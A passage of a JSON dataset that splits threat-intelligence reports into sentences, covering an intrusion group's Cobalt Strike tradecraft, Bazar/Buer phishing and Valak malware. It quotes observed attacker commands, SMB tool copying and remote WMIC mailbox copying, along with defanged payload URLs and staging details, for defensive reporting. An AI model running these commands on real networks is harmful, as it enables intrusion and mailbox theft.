        "id": "cti_reports_filtered/r-786.md:::S134",
        "text": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S135",
        "text": "But not all tools used by the adversary are so called lolbins: As said before, they use Cobalt Strike.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S136",
        "text": "But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S137",
        "text": "But first: How did they get the tools on the victim\u2019s systems?",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S138",
        "text": "The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S139",
        "text": "A few examples of commands we observed:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S140",
        "text": "copy get.exe\\\\<ip>\\c$\\windows\\temp copy msadc\\\\<hostname>\\c$\\Progra~1\\Common~1\\System\\msadc\\ copy update.ex\\\\<ip>\\c$\\windows\\temp\\ move ak002.bat\\\\<ip>\\c$\\windows\\tempup\\date.bat",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S141",
        "text": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S142",
        "text": "As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S143",
        "text": "This document was exfiltrated and used to continue the intrusion via a company portal and VPN.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S144",
        "text": "In all cases we\u2019ve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S145",
        "text": "But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S146",
        "text": "wmic /node:<ip> process call create \"cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\<path>\\<username>\\My Documents\\<filename>.pst\" copy\\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S147",
        "text": "Files and folders of interest are collected as well and staged for exfiltration.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S148",
        "text": "The goal of targeting some victims appears to be to obtain data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S149",
        "text": "How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S150",
        "text": "The DLL\u2019s used were side-loaded in memory on compromised systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S151",
        "text": "After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S152",
        "text": "Adversaries aiming to exfiltrate large amounts of data will often use one or more systems or storage locations for intermittent storage of the collected data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S153",
        "text": "This process is called staging and is one of the of the activities that NCC Group and Fox-IT has observed in the analysed C2 traffic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S154",
        "text": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S155",
        "text": "Most of the times the data is compressed and copied at the same time.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S156",
        "text": "Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S157",
        "text": "The adversary compresses and encrypts the data by using WinRAR from the command-line.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S158",
        "text": "The filename of the command-line executable for WinRAR is RAR.exe by default.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S159",
        "text": "This activity group always uses a renamed version of rar.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S160",
        "text": "We have observed the following filenames overlapping all intrusions:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S161",
        "text": "- jucheck.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S162",
        "text": "- RecordedTV.ms",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S163",
        "text": "- teredo.tmp",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S164",
        "text": "- update.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S165",
        "text": "- msadcs1.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S166",
        "text": "The adversary typically places the executables in the following folders:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S167",
        "text": "- C:\\Users\\Public\\Libraries\\",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S168",
        "text": "- C:\\Users\\Public\\Videos\\",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S169",
        "text": "- C:\\Windows\\Temp\\",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S170",
        "text": "The following four different variants of the use of rar.exe as update.exe we have observed:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S171",
        "text": "The command lines parameters have the following effect:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S172",
        "text": "- a = add to archive.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S173",
        "text": "- m5 = use compression level 5.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S174",
        "text": "- r = recurse subfolders.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S175",
        "text": "- inul = suppress error messages.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S176",
        "text": "- hp<password> = encrypt both file data and headers with password.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S177",
        "text": "The used password, file extensions for the staged data differ per intrusion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S178",
        "text": "We\u2019ve seen the use of .css, .rar, .log.txt, and no extension for staged pieces of data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S179",
        "text": "After compromising a host with a Linux operating systems, data is also compressed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S180",
        "text": "This time the adversary compresses the data as a gzipped tar-file: tar.gz.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S181",
        "text": "Sometimes no file extension is used, or the file extension is .il.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S182",
        "text": "Most of the times the files names are prepended with adsDL_ or contain the word \u201clist\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S183",
        "text": "The files are staged in the home folder of the compromised user account: /home/<username>/\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S184",
        "text": "The adversary uses Cobalt Strike as framework to manage their compromised systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S185",
        "text": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S186",
        "text": "They switched to C2 encapsulated in HTTPS in Q3 2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S187",
        "text": "An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S188",
        "text": "This is important to note because the functionalities of Cobalt Strike\u2019s trial version are limited.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S189",
        "text": "More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S190",
        "text": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S191",
        "text": "The DNS-responses weren\u2019t logged.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S192",
        "text": "This means that only the DNS C2 leaving the victim\u2019s network was logged.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S193",
        "text": "We developed a Python script that decoded and combined most of the logged C2 communication into a human readable format.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S194",
        "text": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S195",
        "text": "With all this activity data, it was possible for us to create some insight into the \u2018office\u2019-hours of this adversary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S196",
        "text": "The activity took place six days a week, rarely on Sundays.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S197",
        "text": "The activity started on average at 02:36 UTC and ended rarely after 13:00 UTC.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S198",
        "text": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S199",
        "text": "These periods match with the Chinese Golden Week holiday.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S200",
        "text": "The adversary also changed their domains for command control around the same time they switched C2 protocols.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S201",
        "text": "They used a subdomain under a regular parent domain with a .com TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S202",
        "text": "The parent domain appspot.com is a domain owned by Google, and part of Google\u2019s App Engine platform as a service.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S203",
        "text": "Azureedge.net is a parent domain owned by Microsoft, and part of Microsoft\u2019s Azure content delivery network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S204",
        "text": "The adversary uses the command and control channel to exfiltrate small amounts of data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S205",
        "text": "This is usually information containing account details.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S206",
        "text": "For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S207",
        "text": "Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S208",
        "text": "This tool exfiltrates specified files to cloud storage web services.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S209",
        "text": "The following cloud storage web services are supported by the malware:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S210",
        "text": "- Dropbox\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S211",
        "text": "- Google Drive",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S212",
        "text": "- OneDrive",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S213",
        "text": "The actor specifies the following arguments when running the exfiltration tool:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S214",
        "text": "- Name of the web service to be used",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S215",
        "text": "- Parameters used for the web service, such as a client ID and/or API key\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S216",
        "text": "- Path of the file to read and exfiltrate to the web service\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S217",
        "text": "We have observed the exfiltration tool in the following locations:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S218",
        "text": "- C:\\Windows\\Temp\\msadcs.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S219",
        "text": "- C:\\Windows\\Temp\\OneDrive.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S220",
        "text": "Hashes of these files are listed at the end of this article.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S221",
        "text": "The adversary attempts to clean-up some of the traces from their intrusions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S222",
        "text": "While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S223",
        "text": "- Windows event logs clearing,",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S224",
        "text": "- File deletion,\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S225",
        "text": "- Timestomping",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S226",
        "text": "An overview of the observed commands can be found in the appendix.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S227",
        "text": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S228",
        "text": "This tool is included in the UnxUtils repository.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S229",
        "text": "This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S230",
        "text": "Creating a timeline is a common thing to do for forensic analysts to get a chronological view of events on a system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S0",
        "text": "In this email campaign, instead of relying on attachments, the attackers included links to what appeared to be a legitimate Google Docs document, which itself contained links to malicious files hosted on Google Drive or, in some cases, hosted elsewhere.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S1",
        "text": "In some previous phishing email campaigns, attackers leveraged SendGrid to distribute the initial emails to hide the Google Drive links in the documents behind a SendGrid URL as a way to bypass traditional defences.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S2",
        "text": "Samples of emails that we have seen are shown in Figure 1 and Figure 2.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S3",
        "text": "The link in both emails is a Google Docs link claiming to host a PDF file with a list of employees that have been terminated, as shown in Figure 3.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S4",
        "text": "The link in the Google Doc redirects to the URL unitedyfl[.]com/print_preview.exe to download the malware payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S5",
        "text": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S6",
        "text": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S7",
        "text": "The packer used in both malware payloads is identical.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S8",
        "text": "Most notably, the packed binaries are exe files with a randomly named export function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S9",
        "text": "The export function is responsible for payload decryption and injection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S10",
        "text": "First, a shellcode is decrypted, which further decrypts a headerless PE loader that has the final payload in its overlay.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S11",
        "text": "The headersless loader allocates memory, maps the payload into memory with proper permissions, and finally transfers control to it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S12",
        "text": "In this campaign, no process self-injection is used to load the payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S13",
        "text": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S14",
        "text": "The Bazar loader is used to download and execute the Bazar backdoor on the target system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S15",
        "text": "The goal of this backdoor is to execute binaries, scripts, modules, kill processes, and then remove itself from the compromised machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S16",
        "text": "The samples used in this campaign heavily rely on control flow obfuscation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S17",
        "text": "The detailed analysis report about this backdoor can be found here.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S18",
        "text": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format: {C&C}/api/v\\d{3}\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S19",
        "text": "The downloaded payload is XOR-encrypted and can be decrypted using the script provided in the appendix.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S20",
        "text": "The downloaded malware was successfully captured by the Zscaler Cloud Sandbox: Figure 6: The Zscaler Cloud Sandbox report.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S21",
        "text": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S22",
        "text": "The C&C server TLS certificate is shown in Figure 7.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S23",
        "text": "Researchers also observed that the backdoor downloads and executes the Cobalt Strike pentesting and post-exploitation toolkit on the victim's machine within some period of time after the infection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S24",
        "text": "By deploying Cobalt Strike, it is clear that this stealthy backdoor is being used to gain a foothold in corporate networks so that ransomware can be deployed, data can be stolen, or network access could be sold to other threat actors.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S25",
        "text": "The Buer loader was first discovered around the end of 2019.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S26",
        "text": "It is a very capable malware written in C and primarily sold on Russian underground forums for around US$400.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S27",
        "text": "Notably, this malware does not function in the CIS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S28",
        "text": "It has most of the important strings encrypted and APIs are loaded by hash, just like most of the sophisticated malware these days.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S29",
        "text": "We are not going to go into technical details because detailed analysis of this has already published.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S30",
        "text": "The Buer loader was captured by the Zscaler Cloud Sandbox.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S31",
        "text": "In addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S32",
        "text": "- Win32.Trojan.Buerloader\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S33",
        "text": "- Win32.Backdoor.Bazar",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S0",
        "text": "In these campaigns, the most common infection vector is via Microsoft Word documents embedded with malicious macro code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S1",
        "text": "The contents of the documents are in English and German depending on the target.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S2",
        "text": "Malicious macro code is used to download a DLL file with .cab extension named \u201cU.tmp\u201d and saved into the temp folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S3",
        "text": "DLL file download address: \u201chxxp://v0rzpbu[.]com/we201o85/aio0i32p.php?l=hopo4.cab\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S4",
        "text": "After downloading the DLL, the code launches the malicious DLL using \u201cregsvr32.exe\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S5",
        "text": "When executed, the DLL drops and launches using a WinExec API call.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S6",
        "text": "This stage of the Valak malware uses a malicious JavaScript file with a random name that changes per execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S7",
        "text": "In the example below the name of the JavaScript file is \u201csly4.0\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S8",
        "text": "The downloaded JavaScript code, \u201csly4.0\u201d, contains a variable called \u201cPRIMARY_C2\u201d that holds multiple fake and legitimate domains, including Google, Gmail, Avast, and Microsoft.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S9",
        "text": "The domain list varies between samples.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S10",
        "text": "Valak creates connections to the different C2 servers in the list with two predefined URIs:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S11",
        "text": "One URI is used to download an encoded file named \u201cproject.aspx\u201d",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S12",
        "text": "[saved as project[1].htm].",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S13",
        "text": "*in version 30, the file was renamed to \u201crpx.aspx\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S14",
        "text": "One URI is used to download an encoded file named \u201ca.aspx\u201d [saved as a[1].htm].\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S15",
        "text": "*in version 30, the file was renamed to \u201cgo.aspx\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S16",
        "text": "Both files are decoded by the malware using Base64 and an XOR cipher.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S17",
        "text": "The key is a combination of a predefined string and information collected from memory during runtime.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S18",
        "text": "The malware sets information like the C2 server, ID, the downloaded payload, and the decoded project.aspx in a registry key under \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S19",
        "text": "These keys will be used in the second stage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S20",
        "text": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S21",
        "text": "The scheduled task is set to launch wscript that executes JavaScript stored as an Alternative Data Stream named \u201cDefault2.ini\u201d in the file \u201cClassic2Application.bz\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S22",
        "text": "The script in the ADS (\u201cDefault2.ini\u201d) executes the content of the registry key, \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\\ServerUrl\u201d, which holds the contents of \u201cproject.aspx\u201d, the second stage JavaScript file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S23",
        "text": "In the first stage, Valak laid the foundation for the attack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S24",
        "text": "In the second stage, it downloads additional modules for reconnaissance activity and to steal sensitive information.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S25",
        "text": "The two payloads (\u201cproject.aspx\u201d and \u201ca.aspx\u201d) and the configuration in the registry keys are used in the second stage to perform malicious activities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S26",
        "text": "The \u201cproject.aspx\u201d, or as we refer to it, the second stage JS, is a JavaScript file that looks very similar to the first stage JavaScript (\u201csly4.0\u201d).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S27",
        "text": "However, on closer inspection it contains additional functions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S28",
        "text": "The script is executed by the scheduled task used to maintain persistence, with its main goal being:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S29",
        "text": "Execute Pluginhost.exe, the plugin management component.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S30",
        "text": "Download and parse additional payloads from the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S31",
        "text": "Save the payloads as Alternate Data Streams and set scheduled tasks to run them.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S32",
        "text": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S33",
        "text": "Stage 2 also contains three unique functions, \u201cCreateExecJob\u201d, \u201cCreateOleExecJob\u201d and \u201cLaunchPlugin\u201d.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S34",
        "text": "These functions are called from the \u201cParseTask\u201d function, and receive the parsed tasks from the C2.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S35",
        "text": "If the malware downloads a payload that starts with the word \u201cODTASK\u201d, it calls \u201cCreateOleExecJob\u201d, which writes the payload as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPerfWatson_%taskname%\u201d to run it.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S36",
        "text": "If the malware receives a content start with the word \u201cPLUGIN\u201d, it calls \u201cLaunchPlugin\u201d, which executes the PluginHost.exe file using WMI with the content as an argument.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S37",
        "text": "If the malware receives a content starting with the word \u201cTASK\u201d, it calls \u201cCreateExecJob\u201d, which writes the content as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPowerUtility_%taskname%W\u201d to run it.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S38",
        "text": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S39",
        "text": "However, the payload can vary, as the attackers can download other payloads to the infected system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S40",
        "text": "In previous infections, Valak downloaded different remote administration tools like putty.exe and NetSupport Manager.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S41",
        "text": "The decoded \u201ca.aspx\u201d is saved in the temporary folder as %TEMP%\\<ID>.bin.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S42",
        "text": "This file, internally named \u201cPluginHost.exe\u201d, is an executable file, and will be used to manage additional components.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S43",
        "text": "Valak\u2019s Modular Plugin Architecture",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S44",
        "text": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S45",
        "text": "The bot class is responsible for reading from several registry entries set by the first stage.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S46",
        "text": "GetID() reads from the registry entry \u201c SetupServiceKey \u201d, which holds the ID.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S47",
        "text": "\u201d, which holds the ID",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S48",
        "text": ".",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S49",
        "text": "GetC2() reads from the registry entry \u201cShimV4\u201d, which holds the C2 domain.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S50",
        "text": "Both functions use the Utils class to read registry entries.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S51",
        "text": "The HTTPClient class contains two functions, post and GetPluginBytes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S52",
        "text": "The GetPluginBytes() function gets the C2 domain using GetC2() and adds an embedded URI.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S53",
        "text": "The URL is used to download an additional module for the plugin.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S54",
        "text": "The Program class contains the main function of the file main().",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S55",
        "text": "This function executes the function GetPluginBytes() to download the module components with type \u201cManagedPlugin\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S56",
        "text": "These components will be loaded reflectively to the executable\u2019s memory and expand the plugin capabilities.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S57",
        "text": "The Utils class contains several maintenance functions used by the other classes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S58",
